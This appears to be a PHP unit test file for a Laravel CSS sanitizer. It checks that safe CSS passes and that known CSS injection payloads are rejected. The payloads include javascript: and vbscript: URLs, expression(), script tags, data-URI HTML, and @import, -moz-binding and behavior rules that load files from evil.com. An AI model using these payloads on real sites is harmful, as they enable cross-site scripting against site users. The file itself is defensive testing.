<?php
// Copyright © 2024–2026 Jasper Ford
// SPDX-License-Identifier: AGPL-3.0-or-later
// Author: Jasper Ford
// See NOTICE file for attribution and acknowledgements.

namespace Tests\Laravel\Unit\Services;

use Tests\Laravel\TestCase;
use App\Services\CSSSanitizer;

class CSSSanitizerTest extends TestCase
{
    private CSSSanitizer $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->sanitizer = new CSSSanitizer();
    }

    // ── sanitize ─────────────────────────────────────────────────────

    public function test_sanitize_allows_valid_css(): void
    {
        $css = '.card { color: red; padding: 10px; }';
        $result = $this->sanitizer->sanitize($css);

        $this->assertStringContainsString('color: red', $result);
        $this->assertStringContainsString('padding: 10px', $result);
    }

    public function test_sanitize_strips_comments(): void
    {
        $css = '/* comment */ .card { color: blue; }';
        $result = $this->sanitizer->sanitize($css);

        $this->assertStringNotContainsString('comment', $result);
        $this->assertStringContainsString('color: blue', $result);
    }

    public function test_sanitize_throws_on_javascript_protocol(): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('javascript:');

        $this->sanitizer->sanitize('.evil { background: url(javascript:alert(1)); }');
    }

    public function test_sanitize_throws_on_expression(): void
    {
        $this->expectException(\Exception::class);
        $this->expectExceptionMessage('expression');

        $this->sanitizer->sanitize('.evil { width: expression(document.body.clientWidth); }');
    }

    public function test_sanitize_throws_on_import(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('@import url(https://evil.com/steal.css);');
    }

    public function test_sanitize_throws_on_vbscript(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('.evil { background: url(vbscript:alert(1)); }');
    }

    public function test_sanitize_throws_on_script_tag(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('<script>alert(1)</script>');
    }

    public function test_sanitize_throws_on_moz_binding(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('.evil { -moz-binding: url(https://evil.com/xbl.xml); }');
    }

    public function test_sanitize_throws_on_behavior(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('.evil { behavior: url(https://evil.com/xss.htc); }');
    }

    public function test_sanitize_filters_disallowed_properties(): void
    {
        $css = '.card { color: red; content: "evil"; }';
        $result = $this->sanitizer->sanitize($css);

        $this->assertStringContainsString('color: red', $result);
        // 'content' is not in allowed list
        $this->assertStringNotContainsString('content:', $result);
    }

    public function test_sanitize_allows_flexbox_properties(): void
    {
        $css = '.container { display: flex; justify-content: center; align-items: center; }';
        $result = $this->sanitizer->sanitize($css);

        $this->assertStringContainsString('display: flex', $result);
        $this->assertStringContainsString('justify-content: center', $result);
    }

    public function test_sanitize_allows_visual_effects(): void
    {
        $css = '.card { opacity: 0.5; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }';
        $result = $this->sanitizer->sanitize($css);

        $this->assertStringContainsString('opacity: 0.5', $result);
        $this->assertStringContainsString('box-shadow:', $result);
    }

    public function test_sanitize_blocks_data_uri_html(): void
    {
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize('.evil { background: url(data:text/html,<script>alert(1)</script>); }');
    }

    public function test_sanitize_returns_empty_for_empty_input(): void
    {
        $result = $this->sanitizer->sanitize('');
        $this->assertSame('', $result);
    }

    public function test_sanitize_rejects_invalid_selector(): void
    {
        // javascript: in selector is rejected
        $css = 'javascript:alert(1) { color: red; }';
        $this->expectException(\Exception::class);
        $this->sanitizer->sanitize($css);
    }

    // ── validate ─────────────────────────────────────────────────────

    public function test_validate_returns_valid_for_safe_css(): void
    {
        $result = $this->sanitizer->validate('.card { color: blue; }');
        $this->assertTrue($result['valid']);
        $this->assertEmpty($result['errors']);
    }

    public function test_validate_returns_errors_for_dangerous_css(): void
    {
        $result = $this->sanitizer->validate('.evil { behavior: url(evil.htc); }');
        $this->assertFalse($result['valid']);
        $this->assertNotEmpty($result['errors']);
    }

    public function test_validate_returns_valid_for_empty_string(): void
    {
        $result = $this->sanitizer->validate('');
        $this->assertTrue($result['valid']);
    }
}
